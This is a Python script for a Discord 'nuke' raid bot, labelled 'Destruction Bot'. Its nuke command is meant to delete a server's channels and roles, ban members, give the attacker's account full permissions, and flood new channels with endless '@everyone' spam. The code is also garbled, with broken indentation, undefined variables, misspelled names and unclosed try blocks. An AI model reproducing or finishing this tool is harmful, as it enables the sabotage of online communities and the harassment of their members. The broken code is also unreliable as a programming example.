import time
import os
import random
import discord
from discord.ext import commands
from discord.ext.commands import Bot
from discord import Permissions
import asyncio

#CONFIG
hackedby = "NAME"
token = os.environ['token']
spamessage = "@everyone get recked."
channelname = "nuked"
prefix = "$"

#####################################################
print("""Starting Destruction Bot""")

client = commands.Bot(command_prefix=prefix)
client.remove_command("help")

@client.event
async def on_ready():
  print("Ready To Destruct")

# nuke all-in-one command
@client.command()
async def nuke(ctx):
  await ctx.message.delete()
  guild = ctx.guild
  try:
    await channel.delete()
    print(f"{channel.name} Was Deleted!")
  except:
    print(f"I was Unable to Delete {channel.name}")
  for role in guild.roles:
    try:
      await role.delete()
      print(f"{role.name} has been deleted!")
   except:
      print(f"I was unable to delete {role.name}")
   await guild.create_text_channel(channelname)
for channel in guild.text_channels:
  link = await channel.create_invite(max_age = 0, max_uses = 0)
print(f"Check Out this Cool Server Out : {link}")
amout = 450
for ban_entry in banned_users:
  user = ban_entry.user
try:
  await user.unban(discordusername)
print("We have unbanned you")
except:
print("We did not unban you")
try:
  await member.ban()
print(f"{member.name}#{member.discriminator} Was Banned!")
try:
  role = disord.utils.get(guild.rules, name = discordusername)
await role.edit(permissions = Permission.all())
print(f"{member.name}#{member.discriminator} got Power!")

@client.event
async def on_guild_channel_create(channel):
  while True:
    await channel.send(random.choice(spamessage))

client.run(token, bot=true)
